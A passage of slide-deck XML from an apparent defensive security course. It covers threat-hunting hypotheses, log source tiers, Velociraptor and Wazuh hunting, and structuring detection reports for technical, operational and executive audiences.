              <a:ext cx="2263200" cy="123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1494" name="Google Shape;1494;p114"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3039975" y="1917000"/>
            <a:ext cx="6103900" cy="3226630"/>
            <a:chOff x="3039975" y="1917000"/>
            <a:chExt cx="6103900" cy="3226630"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1495" name="Google Shape;1495;p114"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3039975" y="1917000"/>
              <a:ext cx="61038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96" name="Google Shape;1496;p114"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3039975" y="3949323"/>
              <a:ext cx="1851000" cy="119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97" name="Google Shape;1497;p114"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5802775" y="1917000"/>
              <a:ext cx="3341100" cy="286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98" name="Google Shape;1498;p114"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5730500" y="2475475"/>
              <a:ext cx="2187000" cy="1661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99" name="Google Shape;1499;p114"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5730500" y="3793330"/>
              <a:ext cx="2219100" cy="135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500" name="Google Shape;1500;p114"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6966550" y="3523794"/>
              <a:ext cx="1853700" cy="1619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501" name="Google Shape;1501;p114"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4236950" y="3217426"/>
              <a:ext cx="1851000" cy="1269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502" name="Google Shape;1502;p114"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3039975" y="2928954"/>
              <a:ext cx="18510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503" name="Google Shape;1503;p114"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4236950" y="3899475"/>
              <a:ext cx="1851000" cy="1244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504" name="Google Shape;1504;p114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GOOD</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1505" name="Google Shape;1505;p114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BAD</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1506" name="Google Shape;1506;p114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Based on:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1507" name="Google Shape;1507;p114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"Adversaries may be using WMI for persistence via event subscriptions, which our current rules don't detect"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08" name="Google Shape;1508;p114"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="221375" y="223900"/>
            <a:ext cx="73299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BUILDING HUNTING HYPOTHESES_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1509" name="Google Shape;1509;p114"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="7" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="221375" y="2735182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✓ Threat intelligence (what are adversaries doing?)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✓ Known gaps in detection coverage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✓ Environmental anomalies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✓ Recent vulnerabilities or campaigns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/>
              <a:t>✓ Incident response findings</a:t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10" name="Google Shape;1510;p114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Think like an attacker, not a defender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Specific, testable, actionable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11" name="Google Shape;1511;p114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"Look for bad stuff"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12" name="Google Shape;1512;p114"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2669427" y="4777621"/>
            <a:ext cx="418200" cy="36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15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3600000" y="2990100"/>
            <a:ext cx="1696200" cy="190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18" name="Google Shape;1518;p115"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5397599" y="2990100"/>
            <a:ext cx="1696200" cy="190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19" name="Google Shape;1519;p115"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7195198" y="2990100"/>
            <a:ext cx="1696200" cy="190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20" name="Google Shape;1520;p115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- Process execution logs (Sysmon Event ID 1)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- Network connections (Sysmon Event ID 3)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/>
              <a:t>- File system activity (Sysmon Event ID 11)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1521" name="Google Shape;1521;p115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TIER 1</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1522" name="Google Shape;1522;p115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- Authentication logs (Windows Security)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- PowerShell logs (Script Block, Transcription)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/>
              <a:t>- DNS queries (Sysmon Event ID 22) </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1523" name="Google Shape;1523;p115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TIER 2</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1524" name="Google Shape;1524;p115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- Registry artifacts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- Prefetch files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- Scheduled tasks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- Services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en"/>
              <a:t>- Browser history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/>
              <a:t>- Memory dumps</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1525" name="Google Shape;1525;p115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TIER 3</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1526" name="Google Shape;1526;p115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WHERE TO HUNT?_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1527" name="Google Shape;1527;p115"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3598725" y="1485850"/>
            <a:ext cx="37194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"/>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Use Wazuh for real-time logs,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rPr lang="en"/>
              <a:t>Velociraptor for forensic deep dives”</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1528" name="Google Shape;1528;p115" title="threat-hunting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755" r="29918" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="2546699" cy="3583200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1529" name="Google Shape;1529;p115" title="What-is-threat-hunting-2-1024x885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3750" r="41809" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280475" y="474638"/>
            <a:ext cx="2940900" cy="46688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116"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3600000" y="2990100"/>
            <a:ext cx="1696200" cy="190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35" name="Google Shape;1535;p116"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5397599" y="2990100"/>
            <a:ext cx="1696200" cy="190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36" name="Google Shape;1536;p116"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7195198" y="2990100"/>
            <a:ext cx="1696200" cy="190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37" name="Google Shape;1537;p116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 - SQL-like syntax for endpoint queries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/>
              <a:t>- Query hundreds of endpoints simultaneously</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1538" name="Google Shape;1538;p116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VQL</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1539" name="Google Shape;1539;p116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 - Pre-built forensic artifacts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/>
              <a:t>- Custom artifact creation</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1540" name="Google Shape;1540;p116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ARTIFACT COLLECTION</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1541" name="Google Shape;1541;p116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 - Reconstruct attack timelines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/>
              <a:t>- Correlate events across endpoints</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1542" name="Google Shape;1542;p116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1543" name="Google Shape;1543;p116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VELOCIRAPTOR</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1544" name="Google Shape;1544;p116"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3598725" y="1485850"/>
            <a:ext cx="37194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ts val="2800"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>What makes Velociraptor powerful?</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1545" name="Google Shape;1545;p116" title="monitoring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46695" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="2546701" cy="3583200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1546" name="Google Shape;1546;p116" title="4da42780-92cf-11e9-8947-d23162406860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29976" r="38529" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280475" y="474638"/>
            <a:ext cx="2940899" cy="4668899"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1547" name="Google Shape;1547;p116"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7195161" y="779050"/>
            <a:ext cx="1696200" cy="190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48" name="Google Shape;1548;p116"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7293038" y="91540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- Hunt across entire fleet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SzPts val="1000"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>- Export results for analysis </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1549" name="Google Shape;1549;p116"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="8" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7293038" y="50257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SCALE HUNTING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17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="237641" y="203879"/>
            <a:ext cx="64803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HANDS-ON THREAT HUNTING</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1555" name="Google Shape;1555;p117"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1214225" y="742950"/>
            <a:ext cx="7120200" cy="389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Mission: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Hunt for signs of compromise in the environment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Hunting Scenarios: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Hunt for suspicious PowerShell execution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Hunt for unauthorized scheduled tasks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Hunt for unusual network connections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Hunt for signs of lateral movement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Hunt for persistence mechanisms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Tools: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Velociraptor VQL queries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Wazuh log analysis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Timeline reconstruction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Find threats that alerts might have missed</a:t>
            </a:r>
            <a:endParaRPr u="none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118"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="149000" y="2287650"/>
            <a:ext cx="5096100" cy="5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700"/>
              <a:t>DOCUMENTATION</a:t>
            </a:r>
            <a:endParaRPr sz="4700"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1561" name="Google Shape;1561;p118"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5619075" y="1179625"/>
            <a:ext cx="2844300" cy="28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Space Grotesk"/>
                <a:ea typeface="Space Grotesk"/>
                <a:cs typeface="Space Grotesk"/>
                <a:sym typeface="Space Grotesk"/>
              </a:rPr>
              <a:t>Technical Skills ≠ Complete Job </a:t>
            </a:r>
            <a:endParaRPr b="1" sz="11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Space Grotesk"/>
                <a:ea typeface="Space Grotesk"/>
                <a:cs typeface="Space Grotesk"/>
                <a:sym typeface="Space Grotesk"/>
              </a:rPr>
              <a:t>You must also: </a:t>
            </a:r>
            <a:endParaRPr b="1" sz="11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✓ Document your findings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✓ Explain to non-technical stakeholders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✓ Justify detection rules and priorities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✓ Share knowledge with team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✓ Create institutional memory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"If you can't explain it, you don't understand it well enough" - Albert Einstein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Great detection engineers are great communicators</a:t>
            </a:r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119"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="23" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="216300" y="226200"/>
            <a:ext cx="67926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PROFESSIONAL DETECTION REPORT_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1567" name="Google Shape;1567;p119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Add tag</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1568" name="Google Shape;1568;p119"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="14" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="763628" y="1466405"/>
            <a:ext cx="2436000" cy="1371300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="118925" lIns="118925" spcFirstLastPara="1" rIns="118925" wrap="square" tIns="118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1. EXECUTIVE SUMMARY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High-level findings (for management)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Risk assessment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Key recommendations</a:t>
            </a:r>
            <a:endParaRPr sz="1100"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1569" name="Google Shape;1569;p119"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="14" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3380779" y="1466405"/>
            <a:ext cx="2436000" cy="1371300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="118925" lIns="118925" spcFirstLastPara="1" rIns="118925" wrap="square" tIns="118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2. METHODOLOGY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What you tested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Tools used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Timeframe</a:t>
            </a:r>
            <a:endParaRPr sz="1100"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1570" name="Google Shape;1570;p119"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="14" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3380763" y="3029241"/>
            <a:ext cx="2436000" cy="1371300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="118925" lIns="118925" spcFirstLastPara="1" rIns="118925" wrap="square" tIns="118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5. RECOMMENDATIONS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Rule deployment plan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Tuning requirements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Next steps</a:t>
            </a:r>
            <a:endParaRPr sz="1100"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1571" name="Google Shape;1571;p119"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="14" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="763612" y="3029241"/>
            <a:ext cx="2436000" cy="13713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8925" lIns="118925" spcFirstLastPara="1" rIns="118925" wrap="square" tIns="118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4. DETECTION COVERAGE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ATT&amp;CK techniques covered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Gaps identified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Prioritized roadmap </a:t>
            </a:r>
            <a:endParaRPr sz="1100"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1572" name="Google Shape;1572;p119"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="14" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5944396" y="3029241"/>
            <a:ext cx="2436000" cy="13713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8925" lIns="118925" spcFirstLastPara="1" rIns="118925" wrap="square" tIns="118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6. APPENDICES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Rule definitions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Screenshots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IOCs</a:t>
            </a:r>
            <a:endParaRPr sz="1100"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1573" name="Google Shape;1573;p119"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="14" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5944396" y="1466401"/>
            <a:ext cx="2436000" cy="13713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8925" lIns="118925" spcFirstLastPara="1" rIns="118925" wrap="square" tIns="1189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3. TECHNICAL FINDINGS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Detailed detection rules created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Attack scenarios tested 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42"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1100"/>
              <a:t>• Results and evidence</a:t>
            </a:r>
            <a:endParaRPr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20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6153000" y="1420300"/>
            <a:ext cx="2991000" cy="125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79" name="Google Shape;1579;p120"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5057775" y="2615613"/>
            <a:ext cx="2991000" cy="1254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0" name="Google Shape;1580;p120"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5994225" y="2706777"/>
            <a:ext cx="1911600" cy="1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b="1" lang="en" sz="1000"/>
              <a:t>TECHNICAL AUDIENCE: </a:t>
            </a:r>
            <a:endParaRPr b="1"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Detailed rule logic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False positive rates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Implementation steps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Technical justifications</a:t>
            </a:r>
            <a:endParaRPr sz="1000"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1581" name="Google Shape;1581;p120"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3076500" y="3772500"/>
            <a:ext cx="2991000" cy="125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2" name="Google Shape;1582;p120"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="252600" y="3429125"/>
            <a:ext cx="2991000" cy="12546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3" name="Google Shape;1583;p120"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1187075" y="3593825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b="1" lang="en" sz="1000"/>
              <a:t>OPERATIONAL AUDIENCE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1000"/>
              <a:t>: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Alert triage procedures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Escalation paths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Response playbooks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Daily operational impact</a:t>
            </a:r>
            <a:endParaRPr sz="1000"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1584" name="Google Shape;1584;p120"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="743550" y="4886747"/>
            <a:ext cx="2991000" cy="2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5" name="Google Shape;1585;p120"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6259200" y="4003350"/>
            <a:ext cx="2884800" cy="114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Know your audience, adjust your message</a:t>
            </a:r>
            <a:endParaRPr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6" name="Google Shape;1586;p120"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8400300" y="2671550"/>
            <a:ext cx="743700" cy="125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7" name="Google Shape;1587;p120"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8147700" y="0"/>
            <a:ext cx="996300" cy="125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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="1588" name="Google Shape;1588;p120"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5310010" y="608711"/>
            <a:ext cx="443595" cy="452628"/>
            <a:chOff x="1242900" y="238125"/>
            <a:chExt cx="5134200" cy="5238750"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1589" name="Google Shape;1589;p120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90" name="Google Shape;1590;p120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91" name="Google Shape;1591;p120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92" name="Google Shape;1592;p120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93" name="Google Shape;1593;p12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94" name="Google Shape;1594;p12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95" name="Google Shape;1595;p12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96" name="Google Shape;1596;p12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97" name="Google Shape;1597;p12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98" name="Google Shape;1598;p12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99" name="Google Shape;1599;p12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600" name="Google Shape;1600;p120"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5422276" y="3016598"/>
            <a:ext cx="443595" cy="452628"/>
            <a:chOff x="1242900" y="238125"/>
            <a:chExt cx="5134200" cy="5238750"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1601" name="Google Shape;1601;p120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02" name="Google Shape;1602;p120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03" name="Google Shape;1603;p120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04" name="Google Shape;1604;p120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05" name="Google Shape;1605;p12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06" name="Google Shape;1606;p12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07" name="Google Shape;1607;p12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08" name="Google Shape;1608;p12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09" name="Google Shape;1609;p12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10" name="Google Shape;1610;p12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11" name="Google Shape;1611;p12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612" name="Google Shape;1612;p120"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="615735" y="3831770"/>
            <a:ext cx="443595" cy="452628"/>
            <a:chOff x="1242900" y="238125"/>
            <a:chExt cx="5134200" cy="5238750"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1613" name="Google Shape;1613;p120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14" name="Google Shape;1614;p120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15" name="Google Shape;1615;p120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16" name="Google Shape;1616;p120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17" name="Google Shape;1617;p12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18" name="Google Shape;1618;p12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19" name="Google Shape;1619;p12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20" name="Google Shape;1620;p12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21" name="Google Shape;1621;p12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22" name="Google Shape;1622;p12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23" name="Google Shape;1623;p12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624" name="Google Shape;1624;p120"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="252600" y="1199800"/>
            <a:ext cx="2881500" cy="10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Writing for Different Audiences require different style of report…</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en">
                <a:latin typeface="Space Grotesk"/>
                <a:ea typeface="Space Grotesk"/>
                <a:cs typeface="Space Grotesk"/>
                <a:sym typeface="Space Grotesk"/>
              </a:rPr>
            </a:br>
            <a:br>
              <a:rPr lang="en"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So how to know which is which?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5" name="Google Shape;1625;p120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TAILOR YOUR MESSAGE_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1626" name="Google Shape;1626;p120"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2346145" y="2236315"/>
            <a:ext cx="2991000" cy="12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27" name="Google Shape;1627;p120"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3304670" y="2273790"/>
            <a:ext cx="1911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b="1" lang="en" sz="1000"/>
              <a:t>EXECUTIVE AUDIENCE: </a:t>
            </a:r>
            <a:endParaRPr b="1"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Business impact (risk reduction)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Cost/benefit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High-level metrics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None/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1000"/>
              <a:t>- Strategic recommendations </a:t>
            </a:r>
            <a:endParaRPr sz="1000"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="1628" name="Google Shape;1628;p120"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="2655072" y="2619798"/>
            <a:ext cx="443595" cy="452628"/>
            <a:chOff x="1242900" y="238125"/>
            <a:chExt cx="5134200" cy="5238750"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1629" name="Google Shape;1629;p120"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1242900" y="1074450"/>
              <a:ext cx="911850" cy="3513825"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" h="140553" w="36474">
                  <a:moveTo>
                    <a:pt x="0" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="140552"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="36474" y="140552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0" name="Google Shape;1630;p120"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5523325" y="1074450"/>
              <a:ext cx="853775" cy="3513825"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" h="140553" w="34151">
                  <a:moveTo>
                    <a:pt x="0" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="140552"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="34151" y="140552"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="34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1" name="Google Shape;1631;p120"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2154725" y="4588250"/>
